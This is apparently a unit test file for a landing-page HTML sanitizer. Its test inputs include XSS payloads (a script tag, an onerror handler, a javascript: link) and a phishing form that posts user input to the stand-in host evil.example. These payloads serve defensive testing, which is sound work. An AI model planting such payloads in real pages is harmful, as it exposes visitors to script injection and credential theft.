import {
  assertPublishableLandingHtml,
  sanitizeLandingHtml,
} from './html-sanitize';

describe('html-sanitize', () => {
  it('removes scripts and event handlers', () => {
    const dirty = `
      <h1>Negócio</h1>
      <img src="https://lh3.googleusercontent.com/a" alt="Foto" onerror="alert(1)" />
      <script>alert(1)</script>
      <a href="javascript:alert(1)">bad</a>
      <a href="https://wa.me/5511999999999">WhatsApp</a>
    `;
    const clean = sanitizeLandingHtml(dirty);
    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('javascript:');
    expect(clean).toContain('https://lh3.googleusercontent.com/a');
    expect(clean).toContain('https://wa.me/5511999999999');
  });

  it('strips form action to prevent external phishing posts', () => {
    const dirty = `
      <h1>Negócio</h1>
      <p>Texto longo o suficiente para o sanitizer processar o formulário completo.</p>
      <form action="https://evil.example/steal" method="POST">
        <input name="email" />
        <button type="submit">Enviar</button>
      </form>
      <a href="https://wa.me/5511999999999">WhatsApp</a>
    `;
    const clean = sanitizeLandingHtml(dirty);
    expect(clean).not.toContain('evil.example');
    expect(clean).not.toMatch(/action\s*=/i);
    expect(clean).toContain('<form');
  });

  it('requires heading and CTA for publishable HTML', () => {
    expect(() => assertPublishableLandingHtml('<p>curto</p>')).toThrow(/too short|empty/i);
    expect(() =>
      assertPublishableLandingHtml(
        '<section><p>Sem título longo o suficiente aqui para passar o limiar mínimo de tamanho do HTML.</p></section>',
      ),
    ).toThrow(/h1|business name/i);
    expect(() =>
      assertPublishableLandingHtml(
        '<section><h1>Barbearia X</h1><p>Texto longo o suficiente para passar o mínimo de caracteres da validação.</p></section>',
      ),
    ).toThrow(/CTA/i);
    expect(() =>
      assertPublishableLandingHtml(
        '<section><h1>Barbearia X</h1><p>Texto longo o suficiente para passar.</p><a href="https://wa.me/1">Agendar</a></section>',
      ),
    ).not.toThrow();
  });
});
